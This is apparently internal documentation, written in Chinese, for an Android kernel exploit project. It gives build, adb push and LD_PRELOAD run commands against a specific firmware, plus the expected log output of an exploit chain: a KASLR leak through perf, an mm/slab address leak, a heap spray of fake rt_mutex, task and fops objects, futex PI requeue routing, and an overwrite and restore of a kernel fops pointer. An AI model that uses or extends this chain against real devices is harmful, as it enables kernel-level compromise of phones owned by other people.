# 01. 观测入口与日志判定

本文只描述当前 probe 真实执行到的路径。当前边界是 3.1：`route-summary` 打印完成后，worker 返回，toybox `id` 输出当前进程身份。

## 入口

```bash
cd exploit
make probe PROJECT=PD2314-AP3A.240905.015.A2 API=35

adb push build/PD2314-AP3A.240905.015.A2/bin/probe.so /data/local/tmp/probe.so
adb shell 'Z_REFCLONE=1 LD_PRELOAD=/data/local/tmp/probe.so /system/bin/toybox id'
```

入口调用顺序：

1. `src/preload.c` constructor 打印 `probe loader starting`。
2. `targets/.../main.c` 的 `run_probe()` 检查 `Z_REFCLONE=1`。
3. `refclone_load()` fork worker，并把 `PROBE_WORKER=1`、`PROBE_ATTEMPT=N`、`LD_PRELOAD` 传给子进程。
4. worker 清掉自己的 `LD_PRELOAD`，检查 fingerprint 和 kernel release。
5. worker 执行 `refclone_run_probe()`。

## 关键日志

一次有效探测至少应出现下面几类日志：

```text
[+] probe worker starting pid=...
[+] probe context pid=... uid=... euid=... gid=... egid=... attr=...
[*] perf probe policy paranoid=...
[*] perf probe candidate page=...
[+] slide-kaslr-perf-ok pid=... base=... slide=...
[*] kernelsnitch collision-scan leaked mm=...
[*] tcp payload geometry slab_base=... fake_lock=... fake_w0=... fake_task=... fake_fops=...
[*] final lock mode=active-final ... waiters_tree=... leftmost=...
[*] main FUTEX_CMP_REQUEUE_PI ret=... errno=...
[*] slide ip side effect calls=... sched_ok=...
[*] misc.fops restore target=... original=... ret=8 errno=0
[+] misc.fops restored to ashmem_fops
[+] route-summary pid=... kaslr=1 base=... slide=... route_done=1
uid=... gid=... groups=...
```

字段含义：

| 字段 | 含义 |
| --- | --- |
| `base` / `slide` | perf probe 解析出的 live KASLR image base 与 slide |
| `leaked mm` | KernelSnitch/mm 碰撞后拿到的 `mm_struct` 邻近地址 |
| `slab_base` | `leaked mm & ~0x7fff` 得到的 order-3 slab 基址 |
| `fake_lock` / `fake_w0` / `fake_task` / `fake_fops` | 同一页 payload 内的 rt_mutex、waiter、task、fops 对象位置 |
| `waiters_tree` | fake lock 的 waiter rb-tree 根，不是 UID/GID 语义 |
| `misc.fops restore ret=8` | `dashmem_misc.fops` 已按 8 字节写回原始 `ashmem_fops` |
| `route_done=1` | futex/rt_mutex 路由线程到达预期收尾 |

## 3.1 终止边界

3.1 的闭环是：

`perf base -> mm/slab -> payload spray -> futex PI route -> dashmem_misc.fops route -> restore -> route-summary`

`route-summary` 之后没有第二阶段动作；当前源码到这里结束。
